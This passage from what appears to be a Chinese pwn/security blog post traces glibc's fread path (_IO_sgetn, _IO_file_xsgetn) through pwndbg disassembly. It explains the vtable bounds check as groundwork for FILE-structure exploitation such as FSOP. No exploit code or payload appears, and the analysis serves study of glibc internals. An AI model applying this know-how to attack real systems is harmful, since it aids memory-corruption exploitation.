0x00007ffff7c29117 &lt;-354841&gt;:        mov    rdi,QWORD PTR [rbx+0x88]</span><br><span class="line">   0x00007ffff7c2911e &lt;-354834&gt;:        mov    eax,DWORD PTR [rdi+0x4]</span><br><span class="line">   0x00007ffff7c29121 &lt;-354831&gt;:        sub    eax,0x1</span><br><span class="line">   0x00007ffff7c29124 &lt;-354828&gt;:        mov    DWORD PTR [rdi+0x4],eax</span><br><span class="line">   0x00007ffff7c29127 &lt;-354825&gt;:        jne    0x7ffff7c2913d &lt;__GI__IO_fread-354803&gt;</span><br><span class="line">   0x00007ffff7c29129 &lt;-354823&gt;:        mov    QWORD PTR [rdi+0x8],0x0</span><br><span class="line">   0x00007ffff7c29131 &lt;-354815&gt;:        xchg   DWORD PTR [rdi],eax</span><br><span class="line">   0x00007ffff7c29133 &lt;-354813&gt;:        sub    eax,0x1</span><br><span class="line">   0x00007ffff7c29136 &lt;-354810&gt;:        jle    0x7ffff7c2913d &lt;__GI__IO_fread-354803&gt;</span><br><span class="line">   0x00007ffff7c29138 &lt;-354808&gt;:        call   0x7ffff7c91300 &lt;__GI___lll_lock_wake_private&gt;</span><br><span class="line">   0x00007ffff7c2913d &lt;-354803&gt;:        mov    rdi,rbp</span><br><span class="line">   0x00007ffff7c29140 &lt;-354800&gt;:        call   0x7ffff7c2a120 &lt;_Unwind_Resume&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>可以看到fread函数最起初实际上是<code>_IO_fread</code>函数，先计算需要读取的字节数<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c7fb34 &lt;fread+4&gt;     push   r15</span><br><span class="line">0x7ffff7c7fb36 &lt;fread+6&gt;     push   r14</span><br><span class="line">0x7ffff7c7fb38 &lt;fread+8&gt;     push   r13</span><br><span class="line">0x7ffff7c7fb3a &lt;fread+10&gt;    push   r12</span><br><span class="line">0x7ffff7c7fb3c &lt;fread+12&gt;    mov    r12, rsi      R12 =&gt; 1</span><br><span class="line">0x7ffff7c7fb3f &lt;fread+15&gt;    push   rbp</span><br><span class="line">0x7ffff7c7fb40 &lt;fread+16&gt;    imul   r12, rdx</span><br><span class="line">0x7ffff7c7fb44 &lt;fread+20&gt;    push   rbx</span><br><span class="line">0x7ffff7c7fb45 &lt;fread+21&gt;    sub    rsp, 0x18     RSP =&gt; 0x7fffffffdca0 (0x7fffffffdcb8 - 0x18)</span><br><span class="line">0x7ffff7c7fb49 &lt;fread+25&gt;    test   r12, r12      0x14 &amp; 0x14     EFLAGS =&gt; 0x206 [ cf PF af zf sf IF df of ac ]</span><br><span class="line">0x7ffff7c7fb4c &lt;fread+28&gt;  ✘ je     fread+177                   &lt;fread+177&gt;</span><br></pre></td></tr></table></figure><p>看到<code>imul   r12, rdx</code>计算得到了需要读取的字节数（0x14正是demo中需要读取的字节数20），如果不为0则继续，为0则直接返回<br>接下来是针对<code>_flags</code>域进行了一些有关锁的操作，然后调用<code>_IO_sgetn</code>函数<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c7fb9b &lt;fread+107&gt;    mov    rdx, r12     RDX =&gt; 0x14</span><br><span class="line">0x7ffff7c7fb9e &lt;fread+110&gt;    mov    rsi, r14     RSI =&gt; 0x555555559480 ◂— 0</span><br><span class="line">0x7ffff7c7fba1 &lt;fread+113&gt;    mov    rdi, rbx     RDI =&gt; 0x5555555592a0 ◂— 0xfbad2484</span><br><span class="line">0x7ffff7c7fba4 &lt;fread+116&gt;    call   _IO_sgetn                   &lt;_IO_sgetn&gt;</span><br></pre></td></tr></table></figure><p>先放上<code>_IO_sgetn</code>的汇编<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disass</span><br><span class="line">Dump of assembler code for function __GI__IO_sgetn:</span><br><span class="line">   0x00007ffff7c8dfd0 &lt;+0&gt;:     endbr64</span><br><span class="line">   0x00007ffff7c8dfd4 &lt;+4&gt;:     push   rbx</span><br><span class="line">   0x00007ffff7c8dfd5 &lt;+5&gt;:     lea    rcx,[rip+0x188a24]        # 0x7ffff7e16a00 &lt;_IO_helper_jumps&gt;</span><br><span class="line">   0x00007ffff7c8dfdc &lt;+12&gt;:    lea    rax,[rip+0x189785]        # 0x7ffff7e17768</span><br><span class="line">   0x00007ffff7c8dfe3 &lt;+19&gt;:    sub    rax,rcx</span><br><span class="line">   0x00007ffff7c8dfe6 &lt;+22&gt;:    sub    rsp,0x20</span><br><span class="line">   0x00007ffff7c8dfea &lt;+26&gt;:    mov    rbx,QWORD PTR [rdi+0xd8]</span><br><span class="line">   0x00007ffff7c8dff1 &lt;+33&gt;:    mov    r8,rbx</span><br><span class="line">   0x00007ffff7c8dff4 &lt;+36&gt;:    sub    r8,rcx</span><br><span class="line">   0x00007ffff7c8dff7 &lt;+39&gt;:    cmp    rax,r8</span><br><span class="line">   0x00007ffff7c8dffa &lt;+42&gt;:    jbe    0x7ffff7c8e010 &lt;__GI__IO_sgetn+64&gt;</span><br><span class="line">=&gt; 0x00007ffff7c8dffc &lt;+44&gt;:    mov    rax,QWORD PTR [rbx+0x40]</span><br><span class="line">   0x00007ffff7c8e000 &lt;+48&gt;:    add    rsp,0x20</span><br><span class="line">   0x00007ffff7c8e004 &lt;+52&gt;:    pop    rbx</span><br><span class="line">   0x00007ffff7c8e005 &lt;+53&gt;:    jmp    rax</span><br><span class="line">   0x00007ffff7c8e007 &lt;+55&gt;:    nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8e010 &lt;+64&gt;:    mov    QWORD PTR [rsp+0x18],rdx</span><br><span class="line">   0x00007ffff7c8e015 &lt;+69&gt;:    mov    QWORD PTR [rsp+0x10],rsi</span><br><span class="line">   0x00007ffff7c8e01a &lt;+74&gt;:    mov    QWORD PTR [rsp+0x8],rdi</span><br><span class="line">   0x00007ffff7c8e01f &lt;+79&gt;:    call   0x7ffff7c89ef0 &lt;_IO_vtable_check&gt;</span><br><span class="line">   0x00007ffff7c8e024 &lt;+84&gt;:    mov    rax,QWORD PTR [rbx+0x40]</span><br><span class="line">   0x00007ffff7c8e028 &lt;+88&gt;:    mov    rdx,QWORD PTR [rsp+0x18]</span><br><span class="line">   0x00007ffff7c8e02d &lt;+93&gt;:    mov    rsi,QWORD PTR [rsp+0x10]</span><br><span class="line">   0x00007ffff7c8e032 &lt;+98&gt;:    mov    rdi,QWORD PTR [rsp+0x8]</span><br><span class="line">   0x00007ffff7c8e037 &lt;+103&gt;:   add    rsp,0x20</span><br><span class="line">   0x00007ffff7c8e03b &lt;+107&gt;:   pop    rbx</span><br><span class="line">   0x00007ffff7c8e03c &lt;+108&gt;:   jmp    rax</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>回到调试，<code>_IO_sgetn</code>先进行安全检测<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8dfd4 &lt;_IO_sgetn+4&gt;     push   rbx</span><br><span class="line">► 0x7ffff7c8dfd5 &lt;_IO_sgetn+5&gt;     lea    rcx, [rip + 0x188a24]           RCX =&gt; 0x7ffff7e16a00 (_IO_helper_jumps) ◂— 0</span><br><span class="line">0x7ffff7c8dfdc &lt;_IO_sgetn+12&gt;    lea    rax, [rip + 0x189785]           RAX =&gt; 0x7ffff7e17768 ◂— 0</span><br><span class="line">0x7ffff7c8dfe3 &lt;_IO_sgetn+19&gt;    sub    rax, rcx                        RAX =&gt; 0xd68 (0x7ffff7e17768 - 0x7ffff7e16a00)</span><br><span class="line">0x7ffff7c8dfe6 &lt;_IO_sgetn+22&gt;    sub    rsp, 0x20                       RSP =&gt; 0x7fffffffdc70 (0x7fffffffdc90 - 0x20)</span><br><span class="line">0x7ffff7c8dfea &lt;_IO_sgetn+26&gt;    mov    rbx, qword ptr [rdi + 0xd8]     RBX, [0x555555559378] =&gt; 0x7ffff7e17600 (_IO_file_jumps) ◂— 0</span><br><span class="line">0x7ffff7c8dff1 &lt;_IO_sgetn+33&gt;    mov    r8, rbx                         R8 =&gt; 0x7ffff7e17600 (_IO_file_jumps) ◂— 0</span><br><span class="line">0x7ffff7c8dff4 &lt;_IO_sgetn+36&gt;    sub    r8, rcx                         R8 =&gt; 0xc00 (0x7ffff7e17600 - 0x7ffff7e16a00)</span><br><span class="line">0x7ffff7c8dff7 &lt;_IO_sgetn+39&gt;    cmp    rax, r8                         0xd68 - 0xc00     EFLAGS =&gt; 0x202 [ cf pf af zf sf IF df of ac ]</span><br><span class="line">0x7ffff7c8dffa &lt;_IO_sgetn+42&gt;  ✘ jbe    _IO_sgetn+64                &lt;_IO_sgetn+64&gt;</span><br></pre></td></tr></table></figure><p>可以看到先计算了<code>_IO_helper_jumps</code> 到某个地址的偏移，又判断了<code>vtable</code>（注意看<code>mov    rbx, qword ptr [rdi + 0xd8]</code>，0xd8正是<code>vtable</code>在<code>_IO_FILE_plus</code>中的偏移）是否在 <code>_IO_helper_jumps</code> 范围之外<br> <code>&lt;_IO_sgetn+64&gt;</code>处正是<code>_IO_vtable_check</code>函数<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x00007ffff7c8e010 &lt;+64&gt;:    mov    QWORD PTR [rsp+0x18],rdx</span><br><span class="line">0x00007ffff7c8e015 &lt;+69&gt;:    mov    QWORD PTR [rsp+0x10],rsi</span><br><span class="line">0x00007ffff7c8e01a &lt;+74&gt;:    mov    QWORD PTR [rsp+0x8],rdi</span><br><span class="line">0x00007ffff7c8e01f &lt;+79&gt;:    call   0x7ffff7c89ef0 &lt;_IO_vtable_check&gt;</span><br></pre></td></tr></table></figure><p>jbe跳转，表示如果 rax &lt;&#x3D; r8，则跳转，即<code>vtable</code>在不在指定范围内，调用<code>_IO_vtable_check</code>来进一步检查（见另一篇<a href="https://r3t2.top/2025/07/27/%E5%8A%AB%E6%8C%81vtable%E4%BB%A5%E5%8F%8AFSOP/">博客</a>）<br>后续调用<code>vtable</code>中的<code>_IO_file_xsgetn</code>函数<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8dffc &lt;_IO_sgetn+44&gt;              mov    rax, qword ptr [rbx + 0x40]     RAX, [_IO_file_jumps+64] =&gt; 0x7ffff7c8b2b0 (__GI__IO_file_xsgetn) ◂— endbr64</span><br><span class="line">0x7ffff7c8e000 &lt;_IO_sgetn+48&gt;              add    rsp, 0x20                       RSP =&gt; 0x7fffffffdc90 (0x7fffffffdc70 + 0x20)</span><br><span class="line">0x7ffff7c8e004 &lt;_IO_sgetn+52&gt;              pop    rbx                             RBX =&gt; 0x5555555592a0</span><br><span class="line">0x7ffff7c8e005 &lt;_IO_sgetn+53&gt;              jmp    rax                         &lt;__GI__IO_file_xsgetn&gt;</span><br></pre></td></tr></table></figure><p>可以看到<code>rbx</code>存储的是<code>vtable</code>地址，<code>rbx + 0x40</code>正是虚表中<code>_IO_file_xsgetn</code>函数<br>放上<code>_IO_file_xsgetn</code>的汇编<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disass</span><br><span class="line">Dump of assembler code for function __GI__IO_file_xsgetn:</span><br><span class="line">=&gt; 0x00007ffff7c8b2b0 &lt;+0&gt;:     endbr64</span><br><span class="line">   0x00007ffff7c8b2b4 &lt;+4&gt;:     push   r15</span><br><span class="line">   0x00007ffff7c8b2b6 &lt;+6&gt;:     push   r14</span><br><span class="line">   0x00007ffff7c8b2b8 &lt;+8&gt;:     push   r13</span><br><span class="line">   0x00007ffff7c8b2ba &lt;+10&gt;:    mov    r13,rsi</span><br><span class="line">   0x00007ffff7c8b2bd &lt;+13&gt;:    push   r12</span><br><span class="line">   0x00007ffff7c8b2bf &lt;+15&gt;:    push   rbp</span><br><span class="line">   0x00007ffff7c8b2c0 &lt;+16&gt;:    push   rbx</span><br><span class="line">   0x00007ffff7c8b2c1 &lt;+17&gt;:    mov    rbx,rdi</span><br><span class="line">   0x00007ffff7c8b2c4 &lt;+20&gt;:    sub    rsp,0x18</span><br><span class="line">   0x00007ffff7c8b2c8 &lt;+24&gt;:    cmp    QWORD PTR [rdi+0x38],0x0</span><br><span class="line">   0x00007ffff7c8b2cd &lt;+29&gt;:    mov    QWORD PTR [rsp],rdx</span><br><span class="line">   0x00007ffff7c8b2d1 &lt;+33&gt;:    je     0x7ffff7c8b4a8 &lt;__GI__IO_file_xsgetn+504&gt;</span><br><span class="line">   0x00007ffff7c8b2d7 &lt;+39&gt;:    mov    rax,QWORD PTR [rsp]</span><br><span class="line">   0x00007ffff7c8b2db &lt;+43&gt;:    lea    r15,[rip+0x18b71e]        # 0x7ffff7e16a00 &lt;_IO_helper_jumps&gt;</span><br><span class="line">   0x00007ffff7c8b2e2 &lt;+50&gt;:    lea    r14,[rip+0x18c47f]        # 0x7ffff7e17768</span><br><span class="line">   0x00007ffff7c8b2e9 &lt;+57&gt;:    sub    r14,r15</span><br><span class="line">   0x00007ffff7c8b2ec &lt;+60&gt;:    mov    r12,rax</span><br><span class="line">   0x00007ffff7c8b2ef &lt;+63&gt;:    test   rax,rax</span><br><span class="line">   0x00007ffff7c8b2f2 &lt;+66&gt;:    je     0x7ffff7c8b3c4 &lt;__GI__IO_file_xsgetn+276&gt;</span><br><span class="line">   0x00007ffff7c8b2f8 &lt;+72&gt;:    nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8b300 &lt;+80&gt;:    mov    rsi,QWORD PTR [rbx+0x8]</span><br><span class="line">   0x00007ffff7c8b304 &lt;+84&gt;:    mov    rbp,QWORD PTR [rbx+0x10]</span><br><span class="line">   0x00007ffff7c8b308 &lt;+88&gt;:    sub    rbp,rsi</span><br><span class="line">   0x00007ffff7c8b30b &lt;+91&gt;:    cmp    rbp,r12</span><br><span class="line">   0x00007ffff7c8b30e &lt;+94&gt;:    jae    0x7ffff7c8b418 &lt;__GI__IO_file_xsgetn+360&gt;</span><br><span class="line">   0x00007ffff7c8b314 &lt;+100&gt;:   test   rbp,rbp</span><br><span class="line">   0x00007ffff7c8b317 &lt;+103&gt;:   jne    0x7ffff7c8b3d8 &lt;__GI__IO_file_xsgetn+296&gt;</span><br><span class="line">   0x00007ffff7c8b31d &lt;+109&gt;:   test   DWORD PTR [rbx],0x100</span><br><span class="line">   0x00007ffff7c8b323 &lt;+115&gt;:   jne    0x7ffff7c8b3f9 &lt;__GI__IO_file_xsgetn+329&gt;</span><br><span class="line">   0x00007ffff7c8b329 &lt;+121&gt;:   mov    rcx,QWORD PTR [rbx+0x38]</span><br><span class="line">   0x00007ffff7c8b32d &lt;+125&gt;:   test   rcx,rcx</span><br><span class="line">   0x00007ffff7c8b330 &lt;+128&gt;:   je     0x7ffff7c8b3d0 &lt;__GI__IO_file_xsgetn+288&gt;</span><br><span class="line">   0x00007ffff7c8b336 &lt;+134&gt;:   mov    rsi,QWORD PTR [rbx+0x40]</span><br><span class="line">   0x00007ffff7c8b33a &lt;+138&gt;:   sub    rsi,rcx</span><br><span class="line">   0x00007ffff7c8b33d &lt;+141&gt;:   cmp    rsi,r12</span><br><span class="line">   0x00007ffff7c8b340 &lt;+144&gt;:   ja     0x7ffff7c8b430 &lt;__GI__IO_file_xsgetn+384&gt;</span><br><span class="line">   0x00007ffff7c8b346 &lt;+150&gt;:   cmp    rsi,0x7f</span><br><span class="line">   0x00007ffff7c8b34a &lt;+154&gt;:   jbe    0x7ffff7c8b3d0 &lt;__GI__IO_file_xsgetn+288&gt;</span><br><span class="line">   0x00007ffff7c8b350 &lt;+160&gt;:   mov    rax,r12</span><br><span class="line">   0x00007ffff7c8b353 &lt;+163&gt;:   xor    edx,edx</span><br><span class="line">   0x00007ffff7c8b355 &lt;+165&gt;:   div    rsi</span><br><span class="line">   0x00007ffff7c8b358 &lt;+168&gt;:   mov    rdi,rdx</span><br><span class="line">   0x00007ffff7c8b35b &lt;+171&gt;:   mov    rdx,r12</span><br><span class="line">   0x00007ffff7c8b35e &lt;+174&gt;:   sub    rdx,rdi</span><br><span class="line">   0x00007ffff7c8b361 &lt;+177&gt;:   mov    rbp,QWORD PTR [rbx+0xd8]</span><br><span class="line">   0x00007ffff7c8b368 &lt;+184&gt;:   movq   xmm0,rcx</span><br><span class="line">   0x00007ffff7c8b36d &lt;+189&gt;:   punpcklqdq xmm0,xmm0</span><br><span class="line">   0x00007ffff7c8b371 &lt;+193&gt;:   mov    rax,rbp</span><br><span class="line">   0x00007ffff7c8b374 &lt;+196&gt;:   movups XMMWORD PTR [rbx+0x8],xmm0</span><br><span class="line">   0x00007ffff7c8b378 &lt;+200&gt;:   sub    rax,r15</span><br><span class="line">   0x00007ffff7c8b37b &lt;+203&gt;:   movups XMMWORD PTR [rbx+0x18],xmm0</span><br><span class="line">   0x00007ffff7c8b37f &lt;+207&gt;:   movups XMMWORD PTR [rbx+0x28],xmm0</span><br><span class="line">   0x00007ffff7c8b383 &lt;+211&gt;:   cmp    r14,rax</span><br><span class="line">   0x00007ffff7c8b386 &lt;+214&gt;:   jbe    0x7ffff7c8b460 &lt;__GI__IO_file_xsgetn+432&gt;</span><br><span class="line">   0x00007ffff7c8b38c &lt;+220&gt;:   mov    rsi,r13</span><br><span class="line">   0x00007ffff7c8b38f &lt;+223&gt;:   mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c8b392 &lt;+226&gt;:   call   QWORD PTR [rbp+0x70]</span><br><span class="line">   0x00007ffff7c8b395 &lt;+229&gt;:   test   rax,rax</span><br><span class="line">   0x00007ffff7c8b398 &lt;+232&gt;:   jle    0x7ffff7c8b488 &lt;__GI__IO_file_xsgetn+472&gt;</span><br><span class="line">   0x00007ffff7c8b39e &lt;+238&gt;:   mov    rdx,QWORD PTR [rbx+0x90]</span><br><span class="line">   0x00007ffff7c8b3a5 &lt;+245&gt;:   add    r13,rax</span><br><span class="line">   0x00007ffff7c8b3a8 &lt;+248&gt;:   sub    r12,rax</span><br><span class="line">   0x00007ffff7c8b3ab &lt;+251&gt;:   cmp    rdx,0xffffffffffffffff</span><br><span class="line">   0x00007ffff7c8b3af &lt;+255&gt;:   je     0x7ffff7c8b3bb &lt;__GI__IO_file_xsgetn+267&gt;</span><br><span class="line">   0x00007ffff7c8b3b1 &lt;+257&gt;:   add    rdx,rax</span><br><span class="line">   0x00007ffff7c8b3b4 &lt;+260&gt;:   mov    QWORD PTR [rbx+0x90],rdx</span><br><span class="line">   0x00007ffff7c8b3bb &lt;+267&gt;:   test   r12,r12</span><br><span class="line">   0x00007ffff7c8b3be &lt;+270&gt;:   jne    0x7ffff7c8b300 &lt;__GI__IO_file_xsgetn+80&gt;</span><br><span class="line">   0x00007ffff7c8b3c4 &lt;+276&gt;:   mov    r13,QWORD PTR [rsp]</span><br><span class="line">   0x00007ffff7c8b3c8 &lt;+280&gt;:   jmp    0x7ffff7c8b448 &lt;__GI__IO_file_xsgetn+408&gt;</span><br><span class="line">   0x00007ffff7c8b3ca &lt;+282&gt;:   nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8b3d0 &lt;+288&gt;:   mov    rdx,r12</span><br><span class="line">   0x00007ffff7c8b3d3 &lt;+291&gt;:   jmp    0x7ffff7c8b361 &lt;__GI__IO_file_xsgetn+177&gt;</span><br><span class="line">   0x00007ffff7c8b3d5 &lt;+293&gt;:   nop    DWORD PTR [rax]</span><br><span class="line">   0x00007ffff7c8b3d8 &lt;+296&gt;:   mov    rdi,r13</span><br><span class="line">   0x00007ffff7c8b3db &lt;+299&gt;:   mov    rdx,rbp</span><br><span class="line">   0x00007ffff7c8b3de &lt;+302&gt;:   sub    r12,rbp</span><br><span class="line">   0x00007ffff7c8b3e1 &lt;+305&gt;:   call   0x7ffff7c283e0 &lt;*ABS*+0xa97d0@plt&gt;</span><br><span class="line">   0x00007ffff7c8b3e6 &lt;+310&gt;:   add    QWORD PTR [rbx+0x8],rbp</span><br><span class="line">   0x00007ffff7c8b3ea &lt;+314&gt;:   mov    r13,rax</span><br><span class="line">   0x00007ffff7c8b3ed &lt;+317&gt;:   test   DWORD PTR [rbx],0x100</span><br><span class="line">   0x00007ffff7c8b3f3 &lt;+323&gt;:   je     0x7ffff7c8b329 &lt;__GI__IO_file_xsgetn+121&gt;</span><br><span class="line">   0x00007ffff7c8b3f9 &lt;+329&gt;:   mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c8b3fc &lt;+332&gt;:   call   0x7ffff7c8d6b0 &lt;_IO_switch_to_main_get_area&gt;</span><br><span class="line">   0x00007ffff7c8b401 &lt;+337&gt;:   mov    rsi,QWORD PTR [rbx+0x8]</span><br><span class="line">   0x00007ffff7c8b405 &lt;+341&gt;:   mov    rbp,QWORD PTR [rbx+0x10]</span><br><span class="line">   0x00007ffff7c8b409 &lt;+345&gt;:   sub    rbp,rsi</span><br><span class="line">   0x00007ffff7c8b40c &lt;+348&gt;:   cmp    rbp,r12</span><br><span class="line">   0x00007ffff7c8b40f &lt;+351&gt;:   jb     0x7ffff7c8b314 &lt;__GI__IO_file_xsgetn+100&gt;</span><br><span class="line">   0x00007ffff7c8b415 &lt;+357&gt;:   nop    DWORD PTR [rax]</span><br><span class="line">   0x00007ffff7c8b418 &lt;+360&gt;:   mov    rdi,r13</span><br><span class="line">   0x00007ffff7c8b41b &lt;+363&gt;:   mov    rdx,r12</span><br><span class="line">   0x00007ffff7c8b41e &lt;+366&gt;:   call   0x7ffff7c28620 &lt;*ABS*+0xa9c10@plt&gt;</span><br><span class="line">   0x00007ffff7c8b423 &lt;+371&gt;:   add    QWORD PTR [rbx+0x8],r12</span><br><span class="line">   0x00007ffff7c8b427 &lt;+375&gt;:   mov    r13,QWORD PTR [rsp]</span><br><span class="line">   0x00007ffff7c8b42b &lt;+379&gt;:   jmp    0x7ffff7c8b448 &lt;__GI__IO_file_xsgetn+408&gt;</span><br><span class="line">   0x00007ffff7c8b42d &lt;+381&gt;:   nop    DWORD PTR [rax]</span><br><span class="line">   0x00007ffff7c8b430 &lt;+384&gt;:   mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c8b433 &lt;+387&gt;:   call   0x7ffff7c8d870 &lt;__GI___underflow&gt;</span><br><span class="line">   0x00007ffff7c8b438 &lt;+392&gt;:   cmp    eax,0xffffffff</span><br><span class="line">   0x00007ffff7c8b43b &lt;+395&gt;:   jne    0x7ffff7c8b300 &lt;__GI__IO_file_xsgetn+80&gt;</span><br><span class="line">   0x00007ffff7c8b441 &lt;+401&gt;:   mov    r13,QWORD PTR [rsp]</span><br><span class="line">   0x00007ffff7c8b445 &lt;+405&gt;:   sub    r13,r12</span><br><span class="line">   0x00007ffff7c8b448 &lt;+408&gt;:   add    rsp,0x18</span><br><span class="line">   0x00007ffff7c8b44c &lt;+412&gt;:   mov    rax,r13</span><br><span class="line">   0x00007ffff7c8b44f &lt;+415&gt;:   pop    rbx</span><br><span class="line">   0x00007ffff7c8b450 &lt;+416&gt;:   pop    rbp</span><br><span class="line">   0x00007ffff7c8b451 &lt;+417&gt;:   pop    r12</span><br><span class="line">   0x00007ffff7c8b453 &lt;+419&gt;:   pop    r13</span><br><span class="line">   0x00007ffff7c8b455 &lt;+421&gt;:   pop    r14</span><br><span class="line">   0x00007ffff7c8b457 &lt;+423&gt;:   pop    r15</span><br><span class="line">   0x00007ffff7c8b459 &lt;+425&gt;:   ret</span><br><span class="line">   0x00007ffff7c8b45a &lt;+426&gt;:   nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8b460 &lt;+432&gt;:   mov    QWORD PTR [rsp+0x8],rdx</span><br><span class="line">   0x00007ffff7c8b465 &lt;+437&gt;:   call   0x7ffff7c89ef0 &lt;_IO_vtable_check&gt;</span><br><span class="line">   0x00007ffff7c8b46a &lt;+442&gt;:   mov    rdx,QWORD PTR [rsp+0x8]</span><br><span class="line">   0x00007ffff7c8b46f &lt;+447&gt;:   mov    rsi,r13</span><br><span class="line">   0x00007ffff7c8b472 &lt;+450&gt;:   mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c8b475 &lt;+453&gt;:   call   QWORD PTR [rbp+0x70]</span><br><span class="line">   0x00007ffff7c8b478 &lt;+456&gt;:   test   rax,rax</span><br><span class="line">   0x00007ffff7c8b47b &lt;+459&gt;:   jg     0x7ffff7c8b39e &lt;__GI__IO_file_xsgetn+238&gt;</span><br><span class="line">   0x00007ffff7c8b481 &lt;+465&gt;:   nop    DWORD PTR [rax+0x0]</span><br><span class="line">   0x00007ffff7c8b488 &lt;+472&gt;:   mov    edx,DWORD PTR [rbx]</span><br><span class="line">   0x00007ffff7c8b48a &lt;+474&gt;:   mov    r13,QWORD PTR [rsp]</span><br><span class="line">   0x00007ffff7c8b48e &lt;+478&gt;:   mov    ecx,edx</span><br><span class="line">   0x00007ffff7c8b490 &lt;+480&gt;:   sub    r13,r12</span><br><span class="line">   0x00007ffff7c8b493 &lt;+483&gt;:   or     edx,0x10</span><br><span class="line">  